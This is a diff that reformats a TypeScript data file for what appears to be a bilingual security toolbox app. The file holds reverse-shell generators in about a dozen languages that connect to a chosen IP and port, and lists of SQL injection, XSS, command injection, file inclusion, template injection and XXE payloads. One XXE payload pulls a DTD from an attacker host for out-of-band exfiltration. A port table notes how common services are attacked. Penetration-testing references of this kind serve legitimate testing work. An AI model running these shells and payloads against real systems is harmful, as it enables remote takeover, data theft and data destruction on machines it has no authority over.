@@ -18,16 +18,54 @@ type ChmodRow = [string, [PermKey, PermKey, PermKey]]
 const shellTemplates: ShellTpl[] = [
   { name: 'Bash TCP', lang: 'bash', tpl: (i, p) => `bash -i >& /dev/tcp/${i}/${p} 0>&1` },
   { name: 'Bash UDP', lang: 'bash', tpl: (i, p) => `sh -i >& /dev/udp/${i}/${p} 0>&1` },
-  { name: 'Netcat (mkfifo)', lang: 'bash', tpl: (i, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${i} ${p} >/tmp/f` },
+  {
+    name: 'Netcat (mkfifo)',
+    lang: 'bash',
+    tpl: (i, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${i} ${p} >/tmp/f`,
+  },
   { name: 'Netcat -e', lang: 'bash', tpl: (i, p) => `nc -e /bin/sh ${i} ${p}` },
-  { name: 'Python3', lang: 'python', tpl: (i, p) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${i}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
-  { name: 'PHP', lang: 'php', tpl: (i, p) => `php -r '$sock=fsockopen("${i}",${p});exec("sh <&3 >&3 2>&3");'` },
-  { name: 'Perl', lang: 'perl', tpl: (i, p) => `perl -e 'use Socket;$i="${i}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'` },
-  { name: 'Ruby', lang: 'ruby', tpl: (i, p) => `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${i}",${p});while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'` },
-  { name: 'PowerShell', lang: 'powershell', tpl: (i, p) => `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${i}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` },
-  { name: 'Java', lang: 'java', tpl: (i, p) => `r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${i}/${p};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()` },
+  {
+    name: 'Python3',
+    lang: 'python',
+    tpl: (i, p) =>
+      `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${i}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
+  },
+  {
+    name: 'PHP',
+    lang: 'php',
+    tpl: (i, p) => `php -r '$sock=fsockopen("${i}",${p});exec("sh <&3 >&3 2>&3");'`,
+  },
+  {
+    name: 'Perl',
+    lang: 'perl',
+    tpl: (i, p) =>
+      `perl -e 'use Socket;$i="${i}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'`,
+  },
+  {
+    name: 'Ruby',
+    lang: 'ruby',
+    tpl: (i, p) =>
+      `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${i}",${p});while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
+  },
+  {
+    name: 'PowerShell',
+    lang: 'powershell',
+    tpl: (i, p) =>
+      `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${i}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
+  },
+  {
+    name: 'Java',
+    lang: 'java',
+    tpl: (i, p) =>
+      `r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${i}/${p};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()`,
+  },
   { name: 'socat', lang: 'bash', tpl: (i, p) => `socat TCP:${i}:${p} EXEC:sh` },
-  { name: 'awk', lang: 'bash', tpl: (i, p) => `awk 'BEGIN {s = "/inet/tcp/0/${i}/${p}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null` },
+  {
+    name: 'awk',
+    lang: 'bash',
+    tpl: (i, p) =>
+      `awk 'BEGIN {s = "/inet/tcp/0/${i}/${p}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
+  },
 ]
 
 export const securityL = {
@@ -56,25 +94,57 @@ export const securityL = {
           items: [
             { label: '万能登录绕过', payload: `' OR '1'='1' -- -`, note: '经典认证绕过' },
             { label: '注释截断', payload: `admin'--`, note: '截断后续 SQL' },
-            { label: '联合查询探测', payload: `' UNION SELECT NULL,NULL,NULL-- -`, note: '列数需与源表一致' },
-            { label: '报错注入 (MySQL)', payload: `' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -`, note: '通过报错回显数据' },
-            { label: '时间盲注', payload: `' AND IF(1=1,SLEEP(5),0)-- -`, note: '通过响应延迟判断' },
-            { label: '布尔盲注', payload: `' AND SUBSTRING((SELECT database()),1,1)='a'-- -`, note: '逐字符猜解' },
+            {
+              label: '联合查询探测',
+              payload: `' UNION SELECT NULL,NULL,NULL-- -`,
+              note: '列数需与源表一致',
+            },
+            {
+              label: '报错注入 (MySQL)',
+              payload: `' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -`,
+              note: '通过报错回显数据',
+            },
+            {
+              label: '时间盲注',
+              payload: `' AND IF(1=1,SLEEP(5),0)-- -`,
+              note: '通过响应延迟判断',
+            },
+            {
+              label: '布尔盲注',
+              payload: `' AND SUBSTRING((SELECT database()),1,1)='a'-- -`,
+              note: '逐字符猜解',
+            },
             { label: '堆叠查询', payload: `'; DROP TABLE users-- -`, note: '部分驱动支持多语句' },
-            { label: '读文件', payload: `' UNION SELECT NULL,LOAD_FILE('/etc/passwd')-- -`, note: '需要 FILE 权限' },
+            {
+              label: '读文件',
+              payload: `' UNION SELECT NULL,LOAD_FILE('/etc/passwd')-- -`,
+              note: '需要 FILE 权限',
+            },
           ],
         },
         {
           name: 'XSS 跨站脚本',
           items: [
             { label: '基础弹窗', payload: `<script>alert(document.domain)</script>` },
-            { label: 'img 事件', payload: `<img src=x onerror=alert(1)>`, note: '绕过 script 过滤' },
+            {
+              label: 'img 事件',
+              payload: `<img src=x onerror=alert(1)>`,
+              note: '绕过 script 过滤',
+            },
             { label: 'svg 事件', payload: `<svg onload=alert(1)>` },
             { label: '事件属性', payload: `" onfocus=alert(1) autofocus="`, note: '闭合属性注入' },
             { label: '伪协议', payload: `<a href="javascript:alert(1)">click</a>` },
             { label: '大小写混淆', payload: `<ScRiPt>alert(1)</sCrIpT>`, note: '绕过黑名单' },
-            { label: '编码绕过', payload: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`, note: 'HTML 实体编码' },
-            { label: 'DOM 型', payload: `#<img src=x onerror=alert(1)>`, note: '通过 location.hash 触发' },
+            {
+              label: '编码绕过',
+              payload: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`,
+              note: 'HTML 实体编码',
+            },
+            {
+              label: 'DOM 型',
+              payload: `#<img src=x onerror=alert(1)>`,
+              note: '通过 location.hash 触发',
+            },
           ],
         },
         {
@@ -94,10 +164,22 @@ export const securityL = {
           items: [
             { label: 'LFI 基础', payload: `../../../../etc/passwd`, note: '逐级回溯' },
             { label: 'URL 编码', payload: `..%2f..%2f..%2fetc%2fpasswd` },
-            { label: '双重编码', payload: `..%252f..%252f..%252fetc%252fpasswd`, note: '绕过一层解码' },
-            { label: 'php://filter', payload: `php://filter/convert.base64-encode/resource=index.php`, note: 'Base64 读取源码' },
+            {
+              label: '双重编码',
+              payload: `..%252f..%252f..%252fetc%252fpasswd`,
+              note: '绕过一层解码',
+            },
+            {
+              label: 'php://filter',
+              payload: `php://filter/convert.base64-encode/resource=index.php`,
+              note: 'Base64 读取源码',
+            },
             { label: 'php://input', payload: `php://input`, note: 'POST body 作为代码执行' },
-            { label: 'data://', payload: `data://text/plain,<?php phpinfo();?>`, note: '需 allow_url_include' },
+            {
+              label: 'data://',
+              payload: `data://text/plain,<?php phpinfo();?>`,
+              note: '需 allow_url_include',
+            },
             { label: '空字节截断', payload: `../../../../etc/passwd%00`, note: 'PHP < 5.3.4' },
           ],
         },
@@ -105,16 +187,32 @@ export const securityL = {
           name: 'SSTI 模板注入',
           items: [
             { label: '探测', payload: `{{7*7}}`, note: '返回 49 则存在注入' },
-            { label: 'Jinja2 探测', payload: `{{7*'7'}}`, note: 'Jinja2 返回 7777777，Twig 返回 49' },
-            { label: 'Jinja2 RCE', payload: `{{''.__class__.__mro__[1].__subclasses__()}}`, note: '枚举可用类' },
+            {
+              label: 'Jinja2 探测',
+              payload: `{{7*'7'}}`,
+              note: 'Jinja2 返回 7777777，Twig 返回 49',
+            },
+            {
+              label: 'Jinja2 RCE',
+              payload: `{{''.__class__.__mro__[1].__subclasses__()}}`,
+              note: '枚举可用类',
+            },
             { label: 'Twig 信息', payload: `{{_self.env}}` },
           ],
         },
         {
           name: 'XXE 实体注入',
           items: [
-            { label: '基础读文件', payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`, note: '配合 &xxe; 引用' },
-            { label: '参数实体', payload: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"> %xxe;]>`, note: 'OOB 外带数据' },
+            {
+              label: '基础读文件',
+              payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`,
+              note: '配合 &xxe; 引用',
+            },
+            {
+              label: '参数实体',
+              payload: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"> %xxe;]>`,
+              note: 'OOB 外带数据',
+            },
           ],
         },
       ] as PayloadGroup[],
@@ -164,11 +262,11 @@ export const securityL = {
       searchLabel: '搜索',
       searchPlaceholder: '404 / redirect / 限流...',
       groups: [
-        ['1xx 信息', c => c < 200],
-        ['2xx 成功', c => c >= 200 && c < 300],
-        ['3xx 重定向', c => c >= 300 && c < 400],
-        ['4xx 客户端错误', c => c >= 400 && c < 500],
-        ['5xx 服务器错误', c => c >= 500],
+        ['1xx 信息', (c) => c < 200],
+        ['2xx 成功', (c) => c >= 200 && c < 300],
+        ['3xx 重定向', (c) => c >= 300 && c < 400],
+        ['4xx 客户端错误', (c) => c >= 400 && c < 500],
+        ['5xx 服务器错误', (c) => c >= 500],
       ] as [string, (c: number) => boolean][],
       codes: [
         [100, 'Continue', '客户端应继续发送请求体'],
@@ -264,27 +362,79 @@ export const securityL = {
         {
           name: 'SQL Injection (SQLi)',
           items: [
-            { label: 'Universal login bypass', payload: `' OR '1'='1' -- -`, note: 'Classic authentication bypass' },
-            { label: 'Comment truncation', payload: `admin'--`, note: 'Truncates the rest of the SQL' },
-            { label: 'UNION probe', payload: `' UNION SELECT NULL,NULL,NULL-- -`, note: 'Column count must match the source table' },
-            { label: 'Error-based (MySQL)', payload: `' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -`, note: 'Leak data via error message' },
-            { label: 'Time-based blind', payload: `' AND IF(1=1,SLEEP(5),0)-- -`, note: 'Infer via response delay' },
-            { label: 'Boolean-based blind', payload: `' AND SUBSTRING((SELECT database()),1,1)='a'-- -`, note: 'Extract char by char' },
-            { label: 'Stacked query', payload: `'; DROP TABLE users-- -`, note: 'Multi-statement supported by some drivers' },
-            { label: 'Read file', payload: `' UNION SELECT NULL,LOAD_FILE('/etc/passwd')-- -`, note: 'Requires FILE privilege' },
+            {
+              label: 'Universal login bypass',
+              payload: `' OR '1'='1' -- -`,
+              note: 'Classic authentication bypass',
+            },
+            {
+              label: 'Comment truncation',
+              payload: `admin'--`,
+              note: 'Truncates the rest of the SQL',
+            },
+            {
+              label: 'UNION probe',
+              payload: `' UNION SELECT NULL,NULL,NULL-- -`,
+              note: 'Column count must match the source table',
+            },
+            {
+              label: 'Error-based (MySQL)',
+              payload: `' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -`,
+              note: 'Leak data via error message',
+            },
+            {
+              label: 'Time-based blind',
+              payload: `' AND IF(1=1,SLEEP(5),0)-- -`,
+              note: 'Infer via response delay',
+            },
+            {
+              label: 'Boolean-based blind',
+              payload: `' AND SUBSTRING((SELECT database()),1,1)='a'-- -`,
+              note: 'Extract char by char',
+            },
+            {
+              label: 'Stacked query',
+              payload: `'; DROP TABLE users-- -`,
+              note: 'Multi-statement supported by some drivers',
+            },
+            {
+              label: 'Read file',
+              payload: `' UNION SELECT NULL,LOAD_FILE('/etc/passwd')-- -`,
+              note: 'Requires FILE privilege',
+            },
           ],
         },
         {
           name: 'XSS (Cross-Site Scripting)',
           items: [
             { label: 'Basic alert', payload: `<script>alert(document.domain)</script>` },
-            { label: 'img onerror', payload: `<img src=x onerror=alert(1)>`, note: 'Bypass script filtering' },
+            {
+              label: 'img onerror',
+              payload: `<img src=x onerror=alert(1)>`,
+              note: 'Bypass script filtering',
+            },
             { label: 'svg onload', payload: `<svg onload=alert(1)>` },
-            { label: 'Event handler attr', payload: `" onfocus=alert(1) autofocus="`, note: 'Inject into attribute' },
+            {
+              label: 'Event handler attr',
+              payload: `" onfocus=alert(1) autofocus="`,
+              note: 'Inject into attribute',
+            },
             { label: 'Pseudo-protocol', payload: `<a href="javascript:alert(1)">click</a>` },
-            { label: 'Case obfuscation', payload: `<ScRiPt>alert(1)</sCrIpT>`, note: 'Bypass blacklist' },
-            { label: 'Encoding bypass', payload: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`, note: 'HTML entity encoding' },
-            { label: 'DOM-based', payload: `#<img src=x onerror=alert(1)>`, note: 'Triggered via location.hash' },
+            {
+              label: 'Case obfuscation',
+              payload: `<ScRiPt>alert(1)</sCrIpT>`,
+              note: 'Bypass blacklist',
+            },
+            {
+              label: 'Encoding bypass',
+              payload: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`,
+              note: 'HTML entity encoding',
+            },
+            {
+              label: 'DOM-based',
+              payload: `#<img src=x onerror=alert(1)>`,
+              note: 'Triggered via location.hash',
+            },
           ],
         },
         {
@@ -295,7 +445,11 @@ export const securityL = {
             { label: 'Pipe', payload: `| cat /etc/passwd` },
             { label: 'Backticks', payload: '`id`', note: 'Command substitution' },
             { label: '$() substitution', payload: `$(cat /etc/passwd)` },
-            { label: 'Space-filter bypass', payload: `cat\${IFS}/etc/passwd`, note: '${IFS} replaces spaces' },
+            {
+              label: 'Space-filter bypass',
+              payload: `cat\${IFS}/etc/passwd`,
+              note: '${IFS} replaces spaces',
+            },
             { label: 'Wildcard bypass', payload: `/bin/c?t /etc/pass?d` },
           ],
         },
@@ -304,11 +458,27 @@ export const securityL = {
           items: [
             { label: 'LFI basics', payload: `../../../../etc/passwd`, note: 'Walk up the tree' },
             { label: 'URL encoding', payload: `..%2f..%2f..%2fetc%2fpasswd` },
-            { label: 'Double encoding', payload: `..%252f..%252f..%252fetc%252fpasswd`, note: 'Bypass one decode pass' },
-            { label: 'php://filter', payload: `php://filter/convert.base64-encode/resource=index.php`, note: 'Read source as Base64' },
+            {
+              label: 'Double encoding',
+              payload: `..%252f..%252f..%252fetc%252fpasswd`,
+              note: 'Bypass one decode pass',
+            },
+            {
+              label: 'php://filter',
+              payload: `php://filter/convert.base64-encode/resource=index.php`,
+              note: 'Read source as Base64',
+            },
             { label: 'php://input', payload: `php://input`, note: 'POST body executed as code' },
-            { label: 'data://', payload: `data://text/plain,<?php phpinfo();?>`, note: 'Requires allow_url_include' },
-            { label: 'Null-byte truncation', payload: `../../../../etc/passwd%00`, note: 'PHP < 5.3.4' },
+            {
+              label: 'data://',
+              payload: `data://text/plain,<?php phpinfo();?>`,
+              note: 'Requires allow_url_include',
+            },
+            {
+              label: 'Null-byte truncation',
+              payload: `../../../../etc/passwd%00`,
+              note: 'PHP < 5.3.4',
+            },
           ],
         },
         {
@@ -316,15 +486,27 @@ export const securityL = {
           items: [
             { label: 'Detect', payload: `{{7*7}}`, note: 'Returns 49 if injectable' },
             { label: 'Jinja2 detect', payload: `{{7*'7'}}`, note: 'Jinja2 → 7777777, Twig → 49' },
-            { label: 'Jinja2 RCE', payload: `{{''.__class__.__mro__[1].__subclasses__()}}`, note: 'Enumerate usable classes' },
+            {
+              label: 'Jinja2 RCE',
+              payload: `{{''.__class__.__mro__[1].__subclasses__()}}`,
+              note: 'Enumerate usable classes',
+            },
             { label: 'Twig info', payload: `{{_self.env}}` },
           ],
         },
         {
           name: 'XXE (Entity Injection)',
           items: [
-            { label: 'Basic file read', payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`, note: 'Use with &xxe; reference' },
-            { label: 'Parameter entity', payload: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"> %xxe;]>`, note: 'OOB data exfiltration' },
+            {
+              label: 'Basic file read',
+              payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`,
+              note: 'Use with &xxe; reference',
+            },
+            {
+              label: 'Parameter entity',
+              payload: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"> %xxe;]>`,
+              note: 'OOB data exfiltration',
+            },
           ],
         },
       ] as PayloadGroup[],
@@ -337,11 +519,26 @@ export const securityL = {
       noteHeader: 'Attack Surface Notes',
       riskyPrefix: '⚠ ',
       data: [
-        { port: 21, service: 'FTP', note: 'Plaintext file transfer; anonymous login flaws are common', risky: true },
+        {
+          port: 21,
+          service: 'FTP',
+          note: 'Plaintext file transfer; anonymous login flaws are common',
+          risky: true,
+        },
         { port: 22, service: 'SSH', note: 'Secure remote login; frequent brute-force target' },
-        { port: 23, service: 'Telnet', note: 'Plaintext remote login; should be disabled', risky: true },
+        {
+          port: 23,
+          service: 'Telnet',
+          note: 'Plaintext remote login; should be disabled',
+          risky: true,
+        },
         { port: 25, service: 'SMTP', note: 'Mail sending; can enumerate users (VRFY/EXPN)' },
-        { port: 53, service: 'DNS', note: 'Name resolution; zone transfer (AXFR) leakage risk', risky: true },
+        {
+          port: 53,
+          service: 'DNS',
+          note: 'Name resolution; zone transfer (AXFR) leakage risk',
+          risky: true,
+        },
         { port: 80, service: 'HTTP', note: 'Primary web service surface' },
         { port: 110, service: 'POP3', note: 'Mail retrieval' },
         { port: 135, service: 'RPC/DCOM', note: 'Windows RPC; EternalBlue recon point' },
@@ -352,20 +549,55 @@ export const securityL = {
         { port: 445, service: 'SMB', note: 'File sharing; MS17-010 EternalBlue', risky: true },
         { port: 873, service: 'rsync', note: 'Unauthorized access allows read/write', risky: true },
         { port: 1080, service: 'SOCKS', note: 'Proxy port; common for pivoting' },
-        { port: 1433, service: 'MSSQL', note: 'SQL Server; xp_cmdshell privilege escalation', risky: true },
+        {
+          port: 1433,
+          service: 'MSSQL',
+          note: 'SQL Server; xp_cmdshell privilege escalation',
+          risky: true,
+        },
         { port: 1521, service: 'Oracle', note: 'Oracle database' },
-        { port: 2049, service: 'NFS', note: 'Network file system; misconfig allows mount', risky: true },
-        { port: 2181, service: 'Zookeeper', note: 'Unauthorized access leaks cluster info', risky: true },
-        { port: 2375, service: 'Docker API', note: 'Unauthorized access spawns privileged container escape', risky: true },
+        {
+          port: 2049,
+          service: 'NFS',
+          note: 'Network file system; misconfig allows mount',
+          risky: true,
+        },
+        {
+          port: 2181,
+          service: 'Zookeeper',
+          note: 'Unauthorized access leaks cluster info',
+          risky: true,
+        },
+        {
+          port: 2375,
+          service: 'Docker API',
+          note: 'Unauthorized access spawns privileged container escape',
+          risky: true,
+        },
         { port: 3000, service: 'Grafana/Dev', note: 'Common dev service port' },
-        { port: 3306, service: 'MySQL', note: 'Weak passwords + UDF privilege escalation', risky: true },
+        {
+          port: 3306,
+          service: 'MySQL',
+          note: 'Weak passwords + UDF privilege escalation',
+          risky: true,
+        },
         { port: 3389, service: 'RDP', note: 'Remote desktop; brute-force / BlueKeep', risky: true },
         { port: 5432, service: 'PostgreSQL', note: 'COPY ... PROGRAM enables RCE' },
         { port: 5900, service: 'VNC', note: 'Remote desktop; weak passwords common' },
-        { port: 6379, service: 'Redis', note: 'Unauthorized access → write SSH key / cron job', risky: true },
+        {
+          port: 6379,
+          service: 'Redis',
+          note: 'Unauthorized access → write SSH key / cron job',
+          risky: true,
+        },
         { port: 8080, service: 'HTTP-Alt', note: 'Tomcat / proxy / various admin panels' },
         { port: 8443, service: 'HTTPS-Alt', note: 'Common admin backend' },
-        { port: 9200, service: 'Elasticsearch', note: 'Unauthorized access leaks data', risky: true },
+        {
+          port: 9200,
+          service: 'Elasticsearch',
+          note: 'Unauthorized access leaks data',
+          risky: true,
+        },
         { port: 11211, service: 'Memcached', note: 'Unauthorized read/write cache', risky: true },
         { port: 27017, service: 'MongoDB', note: 'Unauthorized access / injection', risky: true },
       ] as PortRow[],
@@ -374,11 +606,11 @@ export const securityL = {
       searchLabel: 'Search',
       searchPlaceholder: '404 / redirect / rate-limit...',
       groups: [
-        ['1xx Informational', c => c < 200],
-        ['2xx Success', c => c >= 200 && c < 300],
-        ['3xx Redirection', c => c >= 300 && c < 400],
-        ['4xx Client Error', c => c >= 400 && c < 500],
-        ['5xx Server Error', c => c >= 500],
+        ['1xx Informational', (c) => c < 200],
+        ['2xx Success', (c) => c >= 200 && c < 300],
+        ['3xx Redirection', (c) => c >= 300 && c < 400],
+        ['4xx Client Error', (c) => c >= 400 && c < 500],
+        ['5xx Server Error', (c) => c >= 500],
       ] as [string, (c: number) => boolean][],
       codes: [
         [100, 'Continue', 'Client should continue sending the request body'],
@@ -432,7 +664,13 @@ export const securityL = {
       firstHost: 'First Usable',
       lastHost: 'Last Usable',
       usableHosts: 'Usable Hosts',
-      classLabels: { A: 'A class', B: 'B class', C: 'C class', D: 'D (Multicast) class', E: 'E class' },
+      classLabels: {
+        A: 'A class',
+        B: 'B class',
+        C: 'C class',
+        D: 'D (Multicast) class',
+        E: 'E class',
+      },
       classLabel: 'Address Class',
       privateAddr: 'Private Address',
       privateYes: 'Yes (RFC 1918)',
